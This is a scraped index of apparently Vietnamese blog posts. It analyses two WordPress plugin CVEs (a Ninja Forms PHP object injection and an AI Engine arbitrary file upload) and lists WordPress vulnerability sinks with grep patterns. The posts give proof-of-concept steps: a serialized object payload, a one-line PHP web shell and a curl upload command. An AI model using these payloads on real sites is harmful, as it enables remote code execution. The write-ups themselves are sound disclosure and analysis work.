ƒë√£ ƒëƒÉng k√Ω m·ªôt ajax d√†nh cho Unauthenticated user if( isset( $_POST['formData'] ) ) { $this-\u003e_form_data = json_decode( $_POST['formData'], TRUE ); // php5.2 fallback if( ! $this-\u003e_form_data ) $this-\u003e_form_data = json_decode( stripslashes( $_POST['formData'] ), TRUE ); } add_action( 'wp_ajax_nopriv_nf_ajax_submit', array( $this, 'submit' ) ); T·ª©c khi g·ª≠i POST request ƒë·∫øn endpoint /wp-admin/admin-ajax.php v·ªõi param action=nf_ajax_submit th√¨ callback submit ƒë∆∞·ª£c g·ªçi Khi form ƒë∆∞·ª£c submit ƒë·∫ßy ƒë·ªß th√¨ n√≥ lu·ªìng g·ªçi h√†m s·∫Ω theo tr√¨nh t·ª± n√†y Lu·ªìng g·ªçi h√†m trong callstack\r","date":"2025-11-14","objectID":"/vi/posts/2025-11-14-cve-2025-9083/:4:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-9083 Analysis \u0026 POC","uri":"/vi/posts/2025-11-14-cve-2025-9083/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow\rgraph TD\rA[\"POST /wp-admin/admin-ajax.php\"] -- action=nf_ajax_submit\u0026security=security_code\u0026formData=form_data --\u003e B[\"wp_ajax_nopriv_nf_ajax_submit\"]\rB --\u003e C[\"NF_AJAX_Controllers_Submission::submit()\"]\rC --\u003e D[\"NF_AJAX_Controllers_Submission::process()\"]\rD --\u003e E[\"NF_MergeTags_Fields::add_field()\"]\rE --\u003e F[\"NF_MergeTags_Fields::generateFieldsetTableRows()\"]\rF --\u003e G[\"NF_Handlers_FieldsetRepeater::extractSubmissions()\"] --\u003e H{$fieldSubmissionValue is String?}\rH -- Yes --\u003e I[\"maybe_unserialize($fieldSubmissionValue)\"]\rI --\u003e K(\"RCE\")\rgraph TD\rA[\"POST /wp-admin/admin-ajax.php\"] -- action=nf_ajax_submit\u0026security=security_code\u0026formData=form_data --\u003e B[\"wp_ajax_nopriv_nf_ajax_submit\"]\rB --\u003e C[\"NF_AJAX_Controllers_Submission::submit()\"]\rC --\u003e D[\"NF_AJAX_Controllers_Submission::process()\"]\rD --\u003e E[\"NF_MergeTags_Fields::add_field()\"]\rE --\u003e F[\"NF_MergeTags_Fields::generateFieldsetTableRows()\"]\rF --\u003e G[\"NF_Handlers_FieldsetRepeater::extractSubmissions()\"] --\u003e H{$fieldSubmissionValue is String?}\rH -- Yes --\u003e I[\"maybe_unserialize($fieldSubmissionValue)\"]\rI --\u003e K(\"RCE\")\rgraph TD\rA[\"POST /wp-admin/admin-ajax.php\"] -- action=nf_ajax_submit\u0026security=security_code\u0026formData=form_data --\u003e B[\"wp_ajax_nopriv_nf_ajax_submit\"]\rB --\u003e C[\"NF_AJAX_Controllers_Submission::submit()\"]\rC --\u003e D[\"NF_AJAX_Controllers_Submission::process()\"]\rD --\u003e E[\"NF_MergeTags_Fields::add_field()\"]\rE --\u003e F[\"NF_MergeTags_Fields::generateFieldsetTableRows()\"]\rF --\u003e G[\"NF_Handlers_FieldsetRepeater::extractSubmissions()\"] --\u003e H{$fieldSubmissionValue is String?}\rH -- Yes --\u003e I[\"maybe_unserialize($fieldSubmissionValue)\"]\rI --\u003e K(\"RCE\")\rgraph TD\rA[\"POST /wp-admin/admin-ajax.php\"] -- action=nf_ajax_submit\u0026security=security_code\u0026formData=form_data --\u003e B[\"wp_ajax_nopriv_nf_ajax_submit\"]\rB --\u003e C[\"NF_AJAX_Controllers_Submission::submit()\"]\rC --\u003e D[\"NF_AJAX_Controllers_Submission::process()\"]\rD --\u003e E[\"NF_MergeTags_Fields::add_field()\"]\rE --\u003e F[\"NF_MergeTags_Fields::generateFieldsetTableRows()\"]\rF --\u003e G[\"NF_Handlers_FieldsetRepeater::extractSubmissions()\"] --\u003e H{$fieldSubmissionValue is String?}\rH -- Yes --\u003e I[\"maybe_unserialize($fieldSubmissionValue)\"]\rI --\u003e K(\"RCE\")\r","date":"2025-11-14","objectID":"/vi/posts/2025-11-14-cve-2025-9083/:5:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-9083 Analysis \u0026 POC","uri":"/vi/posts/2025-11-14-cve-2025-9083/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rS·ª≠ d·ª•ng plugin ƒë·ªÉ t·∫°o blank form v·ªõi Single Line Text n·∫±m trong Repeatable Fieldset v√† th√™m form v√†o post/page Submit form v√† cho request ƒëi qua Burp proxy S·ª≠a l·∫°i value c·ªßa field ch·ª©a chu·ªïi serialized thay th√¨ JSON \"O:15:\\\"ObjectInjection\\\":1:{s:7:\\\"command\\\";s:4:\\\"ls /\\\";}\" G·ª≠i l·∫°i request M·∫πo ƒê·ªÉ test tr√™n local, ta t·∫°o class ch·ª©a magic method __wakeup() s·∫Ω t·ª± k√≠ch ho·∫°t khi deserialized ƒë·∫∑t n√≥ trong wp-config.php class ObjectInjection { public $command; function __destruct(){ die(system($this-\u003ecommand)); } } ","date":"2025-11-14","objectID":"/vi/posts/2025-11-14-cve-2025-9083/:6:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-9083 Analysis \u0026 POC","uri":"/vi/posts/2025-11-14-cve-2025-9083/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rL·ªó h·ªïng CVE-2025-9083 b·∫Øt ngu·ªìn t·ª´ vi·ªác s·ª≠ d·ª•ng maybe_unserialize() tr√™n d·ªØ li·ªáu do ng∆∞·ªùi d√πng cung c·∫•p m√† kh√¥ng c√≥ b·∫•t k·ª≥ c∆° ch·∫ø ki·ªÉm so√°t ho·∫∑c h·∫°n ch·∫ø l·ªõp ƒë∆∞·ª£c unserialize. ƒêi·ªÅu n√†y cho ph√©p k·∫ª t·∫•n c√¥ng ch∆∞a x√°c th·ª±c th·ª±c thi m√£ tu·ª≥ √Ω tr√™n h·ªá th·ªëng n·∫øu t√¨m ƒë∆∞·ª£c gadget ph√π h·ª£p trong WordPress ho·∫∑c plugin/theme kh√°c. B·∫£n v√° 3.11.1 ƒë√£ lo·∫°i b·ªè ho√†n to√†n kh·∫£ nƒÉng t·∫°o object b·∫±ng c√°ch s·ª≠ d·ª•ng unserialize() v·ªõi t√πy ch·ªçn ['allowed_classes' =\u003e false], gi√∫p ngƒÉn ch·∫∑n POI ·ªü t·∫ßng c∆° s·ªü. ","date":"2025-11-14","objectID":"/vi/posts/2025-11-14-cve-2025-9083/:0:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-9083 Analysis \u0026 POC","uri":"/vi/posts/2025-11-14-cve-2025-9083/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways\rmaybe_unserialize() c·ª±c k·ª≥ r·ªßi ro khi √°p d·ª•ng l√™n input c·ªßa ng∆∞·ªùi d√πng. Ch·ªâ c·∫ßn m·ªôt gadget t·ªìn t·∫°i trong m√£ ngu·ªìn l√† c√≥ th·ªÉ d·∫´n ƒë·∫øn Remote Code Execution. WordPress AJAX endpoints m·ªü cho unauthenticated user th∆∞·ªùng l√† ƒëi·ªÉm t·∫•n c√¥ng tr·ªçng y·∫øu. JSON embedding khi·∫øn payload serialize ph·∫£i escape c·∫©n th·∫≠n ƒë·ªÉ tr√°nh l·ªói. B·∫£n v√° 3.11.1 ch·ª©ng minh vi·ªác ki·ªÉm so√°t l·ªõp khi unserialize l√† bi·ªán ph√°p ph√≤ng th·ªß quan tr·ªçng. ","date":"2025-11-14","objectID":"/vi/posts/2025-11-14-cve-2025-9083/:0:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-9083 Analysis \u0026 POC","uri":"/vi/posts/2025-11-14-cve-2025-9083/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rDeserialization WordPress Ninja Forms Plugin \u003c 3.11.1 is vulnerable to PHP Object Injection ","date":"2025-11-14","objectID":"/vi/posts/2025-11-14-cve-2025-9083/:1:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-9083 Analysis \u0026 POC","uri":"/vi/posts/2025-11-14-cve-2025-9083/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress AI Engine Plugin.","date":"2025-11-13","objectID":"/vi/posts/2025-11-13-cve-2025-7847/","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-7847 Analysis \u0026 POC","uri":"/vi/posts/2025-11-13-cve-2025-7847/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rPlugin AI Engine cho WordPress t·ªìn t·∫°i l·ªó h·ªïng arbitrary file upload do thi·∫øu file type validation trong h√†m rest_simpleFileUpload() ·ªü c√°c phi√™n b·∫£n 2.9.3 v√† 2.9.4. ƒêi·ªÅu n√†y cho ph√©p authenticated attackers (nh·ªØng k·∫ª t·∫•n c√¥ng ƒë√£ x√°c th·ª±c), v·ªõi quy·ªÅn Subscriber-level tr·ªü l√™n, c√≥ th·ªÉ upload arbitrary files l√™n server c·ªßa trang web b·ªã ·∫£nh h∆∞·ªüng khi REST API ƒë∆∞·ª£c b·∫≠t, t·ª´ ƒë√≥ c√≥ th·ªÉ d·∫´n ƒë·∫øn remote code execution (RCE). CVE ID: CVE-2025-7847 Vulnerability Type: Arbitrary File Upload Affected Versions: 2.9.3-2.9.4 Patched Versions: 2.9.5 CVSS severity: High (9.9) Required Privilege: Subscriber Product: WordPress AI Engine Plugin ","date":"2025-11-13","objectID":"/vi/posts/2025-11-13-cve-2025-7847/:1:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-7847 Analysis \u0026 POC","uri":"/vi/posts/2025-11-13-cve-2025-7847/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - AI Engine: 2.9.4 ‚Äì vulnerable 2.9.5 ‚Äì patched Diff Tool (diff) ‚Üí Meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o. ","date":"2025-11-13","objectID":"/vi/posts/2025-11-13-cve-2025-7847/:2:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-7847 Analysis \u0026 POC","uri":"/vi/posts/2025-11-13-cve-2025-7847/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Cause\rL·ªó h·ªïng x·∫£y ra do h√†m x·ª≠ l√Ω upload cho ph√©p ghi file tr·ª±c ti·∫øp (copy(), file_put_contents()) m√† kh√¥ng ki·ªÉm tra lo·∫°i file ho·∫∑c x√°c th·ª±c ng∆∞·ªùi d√πng, n√™n attacker c√≥ th·ªÉ upload file t√πy √Ω (k·ªÉ c·∫£ .php) v√†o th∆∞ m·ª•c uploads v√† th·ª±c thi m√£ ƒë·ªôc. X√°c th·ª±c file type\r// Validate filename extension for base64 uploads $validate = wp_check_filetype( $filename ); if ( $validate['type'] == false ) { throw new Exception( 'File type is not allowed.' ); } B·∫£n v√° ƒë√£ th√™m ki·ªÉm tra lo·∫°i t·ªáp trong h√†m simpleFileUpload v√† upload_file b·∫±ng wp_check_filetype() ƒë·ªÉ ch·ªâ cho ph√©p upload c√°c ƒë·ªãnh d·∫°ng h·ª£p l·ªá d·ª±a tr√™n whilelist c·ªßa WordPress ","date":"2025-11-13","objectID":"/vi/posts/2025-11-13-cve-2025-7847/:3:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-7847 Analysis \u0026 POC","uri":"/vi/posts/2025-11-13-cve-2025-7847/#cause"},{"categories":["CVE Analysis"],"collections":null,"content":"Code Analysis\rPlugin ƒë√£ ƒëƒÉng k√Ω m·ªôt s·ªë Public API th√¥ng quan h√†m rest_api_init() public function rest_api_init() { $public_api = $this-\u003ecore-\u003eget_option( 'public_api' ); if ( !$public_api ) { return; } $this-\u003ebearer_token = $this-\u003ecore-\u003eget_option( 'public_api_bearer_token' ); if ( !empty( $this-\u003ebearer_token ) ) { add_filter( 'mwai_allow_public_api', [ $this, 'auth_via_bearer_token' ], 10, 3 ); } register_rest_route( 'mwai/v1', '/simpleFileUpload', [ 'methods' =\u003e 'POST', 'callback' =\u003e [ $this, 'rest_simpleFileUpload' ], 'permission_callback' =\u003e function ( $request ) { return $this-\u003ecore-\u003ecan_access_public_api( 'simpleFileUpload', $request ); }, ] ); ... } H√†m s·∫Ω ki·ªÉm tra option Public API ƒë√£ ƒë∆∞·ª£c b·∫≠t hay ch∆∞a. Theo document c·ªßa plugin, m·∫∑c ƒë·ªãnh option n√†y s·∫Ω kh√¥ng ƒë∆∞·ª£c b·∫≠t: By default, the Public REST API is disabled completely. If you enable it, only authentified API requests will actually go through, otherwise they will be rejected. You can override this behavior in many ways and we will see a few examples. The Public REST API is also limited by the Limits set in AI Engine (either as Users or Guests, and System). B·∫°n c√≥ th·ªÉ b·∫∑t ·ªü n√≥ Admin Dashboard t·∫°i wp-admin/admin.php?page=mwai_settings\u0026nekoTab=settings enable the REST API\rTheo m√¥ t·∫£, khi b·∫≠t option n√†y l√™n, ch·ªâ nh·ªØng authentified API requests m·ªõi ƒë∆∞·ª£c th√¥ng qua. C√≥ 2 c√°ch ƒë·ªÉ x√°c th·ª±c: X-WP-Nonce: L·∫•y th√¥ng qua JavaScript Object wpApiSettings d√†nh cho ng∆∞·ªùi d√πng ƒë√£ ƒëƒÉng nh·∫≠p (Subcriber+) Bearer Token: Do admin c·∫•u h√¨nh $this-\u003ebearer_token = $this-\u003ecore-\u003eget_option( 'public_api_bearer_token' ); if ( !empty( $this-\u003ebearer_token ) ) { add_filter( 'mwai_allow_public_api', [ $this, 'auth_via_bearer_token' ], 10, 3 ); } Khi Bearer Token ƒë∆∞·ª£c set,plugin s·∫Ω ƒëƒÉng k√Ω m·ªôt filter c√≥ t√™n mwai_allow_public_api, v·ªõi callback l√† ph∆∞∆°ng th·ª©c auth_via_bearer_token. register_rest_route( 'mwai/v1', '/simpleFileUpload', [ 'methods' =\u003e 'POST', 'callback' =\u003e [ $this, 'rest_simpleFileUpload' ], 'permission_callback' =\u003e function ( $request ) { return $this-\u003ecore-\u003ecan_access_public_api( 'simpleFileUpload', $request ); }, ] ); M·ªôt api ƒë∆∞·ª£c ƒëƒÉng k√Ω v·ªõi method POST: Endpoint: /wp-json/mwai/v1/simpleFileUpload Callback: rest_simpleFileUpload V·ªõi permission_callback l√† k·∫øt qu·∫£ tr·∫£ v·ªÅ c·ªßa can_access_public_api() public function can_access_public_api( $feature, $extra ) { $logged_in = is_user_logged_in(); return apply_filters( 'mwai_allow_public_api', $logged_in, $feature, $extra ); } Trong WP REST API, h√†m is_user_logged_in() s·∫Ω tr·∫£ v·ªÅ: true: N·∫øu ng∆∞·ªùi d√πng ƒë√£ ƒëƒÉng nh·∫≠p v√† header X-WP-Nonce h·ª£p l·ªá false: N·∫øu ng∆∞·ªùi d√πng ch∆∞a ƒëƒÉng nh·∫≠p ho·∫∑c header X-WP-Nonce kh√¥ng h·ª£p l·ªá can_access_public_api s·∫Ω g·ªçi ƒë·∫øn filter mwai_allow_public_api ƒë∆∞·ª£c ƒëƒÉng k√Ω ·ªü tr√™n =\u003e auth_via_bearer_token($logged_in, $feature, $extra) ƒë∆∞·ª£c g·ªçi public function auth_via_bearer_token( $allow, $feature, $extra ) { if ( !empty( $extra ) \u0026\u0026 !empty( $extra-\u003eget_header( 'Authorization' ) ) ) { $token = $extra-\u003eget_header( 'Authorization' ); $token = str_replace( 'Bearer ', '', $token ); if ( $token === $this-\u003ebearer_token ) { // We set the current user to the first admin. $admin = $this-\u003ecore-\u003eget_admin_user(); wp_set_current_user( $admin-\u003eID, $admin-\u003euser_login ); return true; } } return $allow; } H√†m auth_via_bearer_token() d√πng ƒë·ªÉ x√°c th·ª±c b·∫±ng Bearer Token. Quy tr√¨nh c·ªßa n√≥: N·∫øu request c√≥ header Authorization ch·ª©a chu·ªói Bearer \u003ctoken\u003e v√† gi√° tr·ªã \u003ctoken\u003e tr√πng v·ªõi token ƒë∆∞·ª£c l∆∞u trong t√πy ch·ªçn ($this-\u003ebearer_token), th√¨: G√°n ng∆∞·ªùi d√πng hi·ªán t·∫°i th√†nh admin ƒë·∫ßu ti√™n (wp_set_current_user()), Tr·∫£ v·ªÅ true ‚Üí cho ph√©p truy c·∫≠p API. N·∫øu kh√¥ng c√≥ ho·∫∑c token sai ‚Üí tr·∫£ v·ªÅ $allow, t·ª©c l√† k·∫øt qu·∫£ ki·ªÉm tra ban ƒë·∫ßu t·ª´ is_user_logged_in(). Th√¥ng tin\rM·∫∑c ƒë·ªãnh, ta s·∫Ω kh√¥ng c√≥ Bearer Token ƒë·ªÉ x√°c th·ª±c, n√™n ta c·∫ßn d·ª±a v√†o X-WP-Nonce h·ª£p l·ªá c·ªßa Subcriber user =\u003e permission_callback=true public function rest_simpleFileUpload( $request ) { try { $params = $request-\u003eget_params(); $files = $request-\u003eget_file_params(); // Check if file is provided if ( empty( $f","date":"2025-11-13","objectID":"/vi/posts/2025-11-13-cve-2025-7847/:4:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-7847 Analysis \u0026 POC","uri":"/vi/posts/2025-11-13-cve-2025-7847/#code-analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow\rgraph TD\rA[\"POST /wp-json/mwai/v1/simpleFileUpload\"] --\u003e B{\"permission_callback\"}\rB -- Authenticated (X-WP-Nonce or Bearer) --\u003e C[\"rest_simpleFileUpload()\"]\rC --\u003e D[\"simpleFileUpload()\"]\rD --\u003e E[\"files-\u003eupload_file(tmp_name, name, target, ...)\"]\rE --\u003e F[\"Determine extension ‚Üí newFilename = refId.extension\"]\rF --\u003e G{\"target === 'uploads' ?\"}\rG -- Yes --\u003e H[\"copy(path, destination) ‚Üí file placed in uploads\"]\rH --\u003e I{\"No filetype validation\"}\rI -- Yes --\u003e J[\"Uploaded .php accessible via URL\"]\rJ --\u003e L[\"Response contain URL to file\"]\rL --\u003e K[\"Execute PHP ‚Üí Remote Code Execution (RCE)\"]\rgraph TD\rA[\"POST /wp-json/mwai/v1/simpleFileUpload\"] --\u003e B{\"permission_callback\"}\rB -- Authenticated (X-WP-Nonce or Bearer) --\u003e C[\"rest_simpleFileUpload()\"]\rC --\u003e D[\"simpleFileUpload()\"]\rD --\u003e E[\"files-\u003eupload_file(tmp_name, name, target, ...)\"]\rE --\u003e F[\"Determine extension ‚Üí newFilename = refId.extension\"]\rF --\u003e G{\"target === 'uploads' ?\"}\rG -- Yes --\u003e H[\"copy(path, destination) ‚Üí file placed in uploads\"]\rH --\u003e I{\"No filetype validation\"}\rI -- Yes --\u003e J[\"Uploaded .php accessible via URL\"]\rJ --\u003e L[\"Response contain URL to file\"]\rL --\u003e K[\"Execute PHP ‚Üí Remote Code Execution (RCE)\"]\rgraph TD\rA[\"POST /wp-json/mwai/v1/simpleFileUpload\"] --\u003e B{\"permission_callback\"}\rB -- Authenticated (X-WP-Nonce or Bearer) --\u003e C[\"rest_simpleFileUpload()\"]\rC --\u003e D[\"simpleFileUpload()\"]\rD --\u003e E[\"files-\u003eupload_file(tmp_name, name, target, ...)\"]\rE --\u003e F[\"Determine extension ‚Üí newFilename = refId.extension\"]\rF --\u003e G{\"target === 'uploads' ?\"}\rG -- Yes --\u003e H[\"copy(path, destination) ‚Üí file placed in uploads\"]\rH --\u003e I{\"No filetype validation\"}\rI -- Yes --\u003e J[\"Uploaded .php accessible via URL\"]\rJ --\u003e L[\"Response contain URL to file\"]\rL --\u003e K[\"Execute PHP ‚Üí Remote Code Execution (RCE)\"]\rgraph TD\rA[\"POST /wp-json/mwai/v1/simpleFileUpload\"] --\u003e B{\"permission_callback\"}\rB -- Authenticated (X-WP-Nonce or Bearer) --\u003e C[\"rest_simpleFileUpload()\"]\rC --\u003e D[\"simpleFileUpload()\"]\rD --\u003e E[\"files-\u003eupload_file(tmp_name, name, target, ...)\"]\rE --\u003e F[\"Determine extension ‚Üí newFilename = refId.extension\"]\rF --\u003e G{\"target === 'uploads' ?\"}\rG -- Yes --\u003e H[\"copy(path, destination) ‚Üí file placed in uploads\"]\rH --\u003e I{\"No filetype validation\"}\rI -- Yes --\u003e J[\"Uploaded .php accessible via URL\"]\rJ --\u003e L[\"Response contain URL to file\"]\rL --\u003e K[\"Execute PHP ‚Üí Remote Code Execution (RCE)\"]\r","date":"2025-11-13","objectID":"/vi/posts/2025-11-13-cve-2025-7847/:5:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-7847 Analysis \u0026 POC","uri":"/vi/posts/2025-11-13-cve-2025-7847/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rT·∫°o web shell \u003c?php system($_REQUEST[\"cmd\"]); ?\u003e Upload web shell curl -X POST \\ \"http://localhost/wp-json/mwai/v1/simpleFileUpload\" \\ -H \"X-WP-Nonce: 51e6c4a45a\" \\ -F \"file=@rce.php\" \\ -b \"wp-settings-time-1=1762427921; wp-settings-1=libraryContent%3Dbrowse%26editor%3Dtinymce; wordpress_test_cookie=WP%20Cookie%20check; PHPSESSID=9d30c6b076551e37fb4ed7968fd5de98; wp_lang=en_US; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=sub%7C1762706307%7C3gOEpWVViHcurttDwNTWxn1b5CWvZGdOajkR5cjzW3e%7Cda0f415f7f042d4095dbeac711e1742cc23db9ea1d020adbae5c385a36b65b98; wp-settings-5=mfold%3Do; wp-settings-time-5=1762533510\" \\ --proxy 127.0.0.1:8080 # Burp proxy Upload file th√†nh c√¥ng\rRCE v·ªõi web shell RCE v·ªõi file upload\r","date":"2025-11-13","objectID":"/vi/posts/2025-11-13-cve-2025-7847/:6:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-7847 Analysis \u0026 POC","uri":"/vi/posts/2025-11-13-cve-2025-7847/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rCVE-2025-7847 l√† l·ªó h·ªïng arbitrary file upload nghi√™m tr·ªçng trong plugin AI Engine 2.9.3‚Äì2.9.4, cho ph√©p user ƒë√£ x√°c th·ª±c (Subscriber+) upload file b·∫•t k·ª≥ l√™n server qua REST API, d·∫´n t·ªõi RCE. B·∫£n v√° 2.9.5 kh·∫Øc ph·ª•c b·∫±ng ki·ªÉm tra lo·∫°i file (wp_check_filetype). ","date":"2025-11-13","objectID":"/vi/posts/2025-11-13-cve-2025-7847/:0:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-7847 Analysis \u0026 POC","uri":"/vi/posts/2025-11-13-cve-2025-7847/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways\rL·ªó h·ªïng ch·ªâ ·∫£nh h∆∞·ªüng khi REST API Public b·∫≠t v√† user c√≥ X-WP-Nonce h·ª£p l·ªá ho·∫∑c Bearer token. Nguy√™n nh√¢n: thi·∫øu ki·ªÉm tra lo·∫°i file v√† copy file tr·ª±c ti·∫øp v√†o uploads. Gi·∫£i ph√°p: c·∫≠p nh·∫≠t plugin l√™n 2.9.5. ","date":"2025-11-13","objectID":"/vi/posts/2025-11-13-cve-2025-7847/:0:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-7847 Analysis \u0026 POC","uri":"/vi/posts/2025-11-13-cve-2025-7847/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rArbitrary File Upload WordPress AI Engine Plugin 2.9.3-2.9.4 is vulnerable to Arbitrary File Upload ","date":"2025-11-13","objectID":"/vi/posts/2025-11-13-cve-2025-7847/:1:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-7847 Analysis \u0026 POC","uri":"/vi/posts/2025-11-13-cve-2025-7847/#references"},{"categories":["Bug Bounty"],"collections":null,"content":"A list of 'sink' points in WordPress ‚Äî where input data can lead to the execution of malicious actions.","date":"2025-11-13","objectID":"/vi/posts/2025-11-13-wordpress-vulnerability-sink/","tags":["sink","wordpress"],"title":"WordPress Vulnerability Sinks","uri":"/vi/posts/2025-11-13-wordpress-vulnerability-sink/"},{"categories":["Bug Bounty"],"collections":null,"content":"Why This Article?\rTrong qu√° tr√¨nh pentest vi·ªác x√°c ƒë·ªãnh c√°c ƒëi·ªÉm sink l√† b∆∞·ªõc then ch·ªët ‚Äî ƒë√≥ l√† n∆°i d·ªØ li·ªáu ƒë·∫ßu v√†o (user-controlled) th·ª±c s·ª± ƒë∆∞·ª£c ti√™u th·ª• v√† c√≥ kh·∫£ nƒÉng g√¢y ra h√†nh vi ƒë·ªôc h·∫°i (RCE, SQLi, XSS, file write, v.v.). M·ªói l·ªó h·ªïng th∆∞·ªùng li√™n quan ƒë·∫øn m·ªôt ho·∫∑c nhi·ªÅu sink; n·∫øu ch·ªâ t√¨m input kh√¥ng th√¥i th√¨ d·ªÖ b·ªè s√≥t ƒë∆∞·ªùng d·∫´n th·ª±c thi. M·ª•c ti√™u c·ªßa b√†i vi·∫øt n√†y l√†: T·ªïng h·ª£p t·∫≠p trung c√°c sink th∆∞·ªùng g·∫∑p trong WordPress ƒë·ªÉ d·ªÖ tra c·ª©u. B·∫±ng c√°ch c√≥ m·ªôt ‚Äúb·∫£n ƒë·ªì sink‚Äù r√µ r√†ng, pentester, CVE analyst v√† developer s·∫Ω ti·∫øp c·∫≠n l·ªó h·ªïng hi·ªáu qu·∫£ h∆°n ‚Äî t·ª´ ph√°t hi·ªán t·ªõi kh·∫Øc ph·ª•c. ","date":"2025-11-13","objectID":"/vi/posts/2025-11-13-wordpress-vulnerability-sink/:1:0","tags":["sink","wordpress"],"title":"WordPress Vulnerability Sinks","uri":"/vi/posts/2025-11-13-wordpress-vulnerability-sink/#why-this-article"},{"categories":["Bug Bounty"],"collections":null,"content":"WordPress Sink Catalog\r","date":"2025-11-13","objectID":"/vi/posts/2025-11-13-wordpress-vulnerability-sink/:2:0","tags":["sink","wordpress"],"title":"WordPress Vulnerability Sinks","uri":"/vi/posts/2025-11-13-wordpress-vulnerability-sink/#wordpress-sink-catalog"},{"categories":["Bug Bounty"],"collections":null,"content":"SQL Injection (SQLi)\r$wpdb-\u003equery $wpdb-\u003eget_var $wpdb-\u003eget_row $wpdb-\u003eget_col $wpdb-\u003eget_results \\$wpdb-\u003e\\s*(query|get_(var|row|col|results))\\s* Ghi ch√∫ Magic Quotes l√† t√≠nh nƒÉng PHP t·ª± ƒë·ªông escape k√Ω t·ª± ƒë·∫∑c bi·ªát (', \", \\, NULL) trong d·ªØ li·ªáu ƒë·∫ßu v√†o ƒë·ªÉ gi·∫£m nguy c∆° SQL Injection. N√≥ kh√¥ng ho√†n h·∫£o, ch·ªâ escape m·ªôt s·ªë k√Ω t·ª± v√† PHP ƒë√£ t·∫Øt m·∫∑c ƒë·ªãnh. WordPress v·∫´n d√πng c∆° ch·∫ø n√†y qua wp_magic_quotes() v√† add_magic_quotes() ƒë·ªÉ t·ª± ƒë·ªông x·ª≠ l√Ω $_GET, $_POST, $_COOKIE, $_SERVER, nh∆∞ng developer n√™n d√πng c√°c bi·ªán ph√°p chu·∫©n nh∆∞ $wpdb-\u003eprepare() ƒë·ªÉ ch·ªëng SQLi. ","date":"2025-11-13","objectID":"/vi/posts/2025-11-13-wordpress-vulnerability-sink/:2:1","tags":["sink","wordpress"],"title":"WordPress Vulnerability Sinks","uri":"/vi/posts/2025-11-13-wordpress-vulnerability-sink/#sql-injection-sqli"},{"categories":["Bug Bounty"],"collections":null,"content":"Cross-Site Scripting (XSS)\radd_shortcode register_block_type elementor/widgets/register render \\b(add_shortcode|register_block_type|elementor/widgets/register|render|print|echo|innerHTML|outerHTML|document\\.write)\\b ","date":"2025-11-13","objectID":"/vi/posts/2025-11-13-wordpress-vulnerability-sink/:2:2","tags":["sink","wordpress"],"title":"WordPress Vulnerability Sinks","uri":"/vi/posts/2025-11-13-wordpress-vulnerability-sink/#cross-site-scripting-xss"},{"categories":["Bug Bounty"],"collections":null,"content":"Local File Inclusion (LFI)\rinclude include_once require require_once \\b(include|require)(_once)?\\b Ghi ch√∫ Remote File Inclusion (RFI) x·∫£y ra khi ·ª©ng d·ª•ng PHP cho ph√©p include/require m·ªôt t·∫≠p tin t·ª´ URL do ng∆∞·ªùi d√πng ki·ªÉm so√°t ‚Äî ƒëi·ªÅu ki·ªán th∆∞·ªùng l√† allow_url_fopen v√† allow_url_include b·∫≠t ‚Äî d·∫´n t·ªõi vi·ªác t·∫£i v√† th·ª±c thi m√£ PHP t·ª´ m√°y ch·ªß t·ª´ xa, g√¢y remote code execution. NgƒÉn ch·∫∑n b·∫±ng c√°ch t·∫Øt allow_url_include, kh√¥ng d√πng input tr·ª±c ti·∫øp trong include/require, v√† √°p whitelist/normalize ƒë∆∞·ªùng d·∫´n. ","date":"2025-11-13","objectID":"/vi/posts/2025-11-13-wordpress-vulnerability-sink/:2:3","tags":["sink","wordpress"],"title":"WordPress Vulnerability Sinks","uri":"/vi/posts/2025-11-13-wordpress-vulnerability-sink/#local-file-inclusion-lfi"},{"categories":["Bug Bounty"],"collections":null,"content":"Server Side Request Forgery (SSRF)\rPHP related file_get_contents readfile fopen stream_get_contents file curl_exec / cURL \\b(file_get_contents|readfile|fopen|stream_get_contents|file|curl_exec|curl_init|curl_setopt|curl_multi_exec)\\b WordPress related wp_remote_head wp_remote_get wp_remote_post wp_remote_request \\bwp_remote_(head|get|post|request)\\b ","date":"2025-11-13","objectID":"/vi/posts/2025-11-13-wordpress-vulnerability-sink/:2:4","tags":["sink","wordpress"],"title":"WordPress Vulnerability Sinks","uri":"/vi/posts/2025-11-13-wordpress-vulnerability-sink/#server-side-request-forgery-ssrf"},{"categories":["Bug Bounty"],"collections":null,"content":"Arbitrary File Upload\rPHP related move_uploaded_file file_put_contents fwrite fputs copy 